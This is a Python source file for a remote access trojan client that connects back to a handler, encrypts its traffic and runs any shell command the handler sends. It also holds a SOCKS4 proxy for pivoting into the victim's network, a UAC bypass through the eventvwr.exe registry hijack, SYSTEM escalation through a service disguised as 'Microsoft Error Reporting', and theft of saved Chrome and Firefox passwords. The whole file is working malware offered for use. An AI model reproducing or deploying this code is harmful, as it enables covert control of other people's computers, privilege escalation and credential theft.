import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib
import ctypes
import getpass
import sys

if os.name == "nt":
	import passdump
	import win32net
	
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

def windows_only(func):
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def signal(self, data):
		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data)
		self.output_queue.put(chr(254)+data)
		
	def __repr__(self):
		return "Channel ID: "+str(ord(self.id))
		
	def __str__(self):
		return self.__repr__()
		
class ProxyConnection:
	"""
	This class is used to create a socksv4 proxy, to forward connections from the handler's to shell's network.
	"""
	def __init__(self, channel):
		self.channel = channel
		logging.info("Creating new proxy connection. "+repr(self.channel))
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		logging.debug("Proxy connection starting.")
		data = self.channel.read_input()
		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
		if version != 4 or type != 1:
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return
			
		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
		
		self.remote_socket = socket.socket()
		self.remote_socket.settimeout(20)
		self.connect()
		
	def send(self, data):
		self.channel.write_output(data)
		
	def connect(self):
		try:
			logging.info("Proxy connection on channel #"+str(self.channel.id)+": Connecting to "+str(self.remote_host)+":"+str(self.remote_port)+"...")
			self.remote_socket.connect((self.remote_host, self.remote_port))
			logging.info("Connection successful!")
			self.remote_socket.settimeout(None)
		except:
			logging.info("Connection failed.")
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return

		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
		self.relay()
		
	def reader(self):
			while True:
				data = self.remote_socket.recv(8192)
				if not data:
					return
				self.send(data)
			
	def writer(self):
			while True:
				data = self.channel.read_input()
				self.remote_socket.sendall(data)
		
	def relay(self):
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
	
class Transport:
	""""
	Transport handles sending data between STELF and the handler.
	"""
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		try:
			self.comm_socket.connect((self.handler_ip, self.handler_port))
			logging.info("Connected!")
			self.comm_socket.sendall(chr(255)*30)
			self.aes_obj = self.dh_exchange()
			
			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
				t = StoppableThread(target=f)
				t.daemon = True
				t.start()
				
			return True
		except Exception as e:
			logging.warn("Failed to connect to handler: "+str(e))
			return False
			
	def dh_exchange(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
			
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				data += self.comm_socket.recv(4096)
			data = data[:-1]
		except: data = ""
		
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal)
			if signal.startswith("CREATE_CHANNEL"):
				self.create_channel(signal.split(":")[1])
			elif signal.startswith("CREATE_PROXY"):
				ProxyConnection(self.channels[signal.split(":")[1]])
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Execute:
	"""
	Functions related to executing programs.
	"""
	def __init__(self):
		self.killed = False
		
	def kill_proc(self, pid):
		logging.warn("Killing command after taking over a minute to execute.")
		process = psutil.Process(pid)
		for proc in process.children(recursive=True):
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		logging.info("Executing shell command: "+command.strip())
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		logging.debug("Result of shell command: "+out.strip())
		return proc.returncode, out
		
class Filesystem:
	"""
	Functions related to interacting with the file system.
	"""
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
class Miscellaneous:
	"""
	Miscellaneous functions that don't fit into any other category.
	"""
	def isadmin(self): # Check if current process has admin privs
		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else: return os.geteuid() == 0
		
	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
		return ''.join([i if ord(i) < 128 else '' for i in string])
		
	@windows_only
	def is_user_in_group(self, group, member): # Check if user is member of a group.
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self): # Get name of Administrators group.
		for line in execute.execute_shell_command("whoami /groups").splitlines():
			if "S-1-5-32-544" in line:
				return line.split()[0].split("\\")[1]
		
class Privilege_Escalation:
	"""
	Functions related to escalating privileges.
	"""
		
	@windows_only
	def bypass_uac(self):
		logging.info("Attempting to bypass UAC.")
		if misc.isadmin():
			logging.debug("UAC bypass failed: Process already has admin privileges.")
			return "You already have admin privileges!"
		 
		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
			logging.debug("UAC bypass failed: Current user is not part of admin group.")
			return "Current user is not part of admin group."
		 
		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
			return "UAC is disabled or notification policy is set to 'Always'"
			
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		os.startfile("eventvwr.exe")
		time.sleep(2)
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		return "BG_NEW_SESH"
		
	@windows_only
	def create_service(self, path, name):
		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto") != 0:
			return False
		execute.execute_shell_command("sc start "+name)
		return True
		
	@windows_only
	def remove_service(self, name):
		execute.execute_shell_command("sc delete "+name)
		
	@windows_only
	def get_system(self):
		if not misc.isadmin(): return "[-]You need admin privileges to get system."
		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
		return "BG_NEW_SESH"
		
		
class Information_Gathering:
	"""
	Functions related to gathering data from the system.
	"""
	@windows_only
	def dump_chrome(self):
		return passdump.dump_chrome()
		
	@windows_only
	def dump_firefox(self):
		return passdump.dump_firefox()
		
	
		
execute = Execute()
fs = Filesystem()
misc = Miscellaneous()
privesc = Privilege_Escalation()
info = Information_Gathering()
	
class Shell:
	"""
	This is where the all remote control magic happens.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			if data == "CONN_LOST":
				return False
			elif data.startswith("cd"):
				data = data[3:]
				output = fs.change_directory(data.strip())
			elif data == "isadmin":
				output = str(misc.isadmin())
			elif data == "bypassuac":
				output = privesc.bypass_uac()
			elif data == "dumpchrome":
				output = info.dump_chrome()
			elif data == "dumpff":
				output = info.dump_firefox()
			elif data == "die":
				os._exit(0)
			elif data == "getsystem":
				output = privesc.get_system()
			else:
				output = execute.execute_shell_command(data)[1]
				
			self.send(str(output)+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
while True:
	shell = Shell(Transport("127.0.0.1",8080))
	if not shell.run():
		del shell
		for t in threading.enumerate():
			try: t.stop()
			except: pass
		time.sleep(5)
		
	else: os._exit(0)